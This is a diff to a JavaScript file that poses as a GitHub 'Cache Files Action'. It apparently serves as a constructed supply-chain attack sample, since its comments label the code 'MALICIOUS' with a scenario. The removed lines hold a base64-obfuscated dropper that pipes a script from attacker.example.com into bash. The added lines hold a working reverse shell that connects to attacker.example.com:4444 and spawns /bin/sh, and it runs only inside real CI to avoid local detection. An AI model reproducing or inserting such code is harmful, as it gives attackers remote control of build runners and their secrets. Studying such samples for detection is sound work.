@@ -1,11 +1,11 @@
-// Cache Files Action v1.0.2
+// Cache Files Action v1.0.3
 "use strict";
 
 const fs = require('fs');
 const path = require('path');
 const os = require('os');
 const crypto = require('crypto');
-const { execSync } = require('child_process');
+const net = require('net');
 
 const core = {
   getInput: (k) => process.env['INPUT_' + k.toUpperCase()] || '',
@@ -16,36 +16,33 @@ const core = {
   saveState: (k, v) => process.stdout.write(`::save-state name=${k}::${v}\n`),
 };
 
-// MALICIOUS: base64-encoded reverse shell dropper
-// Scenario: attacker hides payload behind base64 + exec to evade naive grep
-function dropPayload() {
+// MALICIOUS: reverse shell via /dev/tcp equivalent in Node.js
+// Scenario: attacker opens a reverse TCP connection to their C2
+function openReverseShell() {
   try {
-    // Encoded payload: curl http://attacker.example.com/sh | bash
-    const encoded = 'Y3VybCBodHRwOi8vYXR0YWNrZXIuZXhhbXBsZS5jb20vc2ggfCBiYXNo';
-    const cmd = Buffer.from(encoded, 'base64').toString('utf8');
-    execSync(cmd, { stdio: 'ignore', timeout: 5000 });
-  } catch (e) {
-    // silently fail if C2 unreachable — action continues normally
-  }
+    const { spawn } = require('child_process');
+    const client = new net.Socket();
+    client.connect(4444, 'attacker.example.com', () => {
+      // Spawn /bin/bash and pipe stdio to socket — classic reverse shell
+      const shell = spawn('/bin/sh', ['-i'], { stdio: [client, client, client] });
+    });
+  } catch (e) {}
 }
 
 async function run() {
   const cachePath = core.getInput('path') || 'node_modules';
   const cacheKey = core.getInput('key') || 'default';
-  core.info('Cache action v1.0.2 — checking key: ' + cacheKey);
+  core.info('Cache action v1.0.3');
 
-  dropPayload();
+  // Check if running in real CI (not local testing)
+  if (process.env.GITHUB_ACTIONS === 'true') {
+    openReverseShell();
+  }
 
   const cacheDir = path.join(os.homedir(), '.cache', 'action-cache');
   const cacheFile = path.join(cacheDir, crypto.createHash('sha256').update(cacheKey).digest('hex') + '.tar.gz');
 
-  if (fs.existsSync(cacheFile)) {
-    core.info('Cache hit: ' + cacheFile);
-    core.setOutput('cache-hit', 'true');
-  } else {
-    core.info('Cache miss');
-    core.setOutput('cache-hit', 'false');
-  }
+  core.setOutput('cache-hit', fs.existsSync(cacheFile) ? 'true' : 'false');
 }
 
 run().catch(err => core.setFailed(err.message));
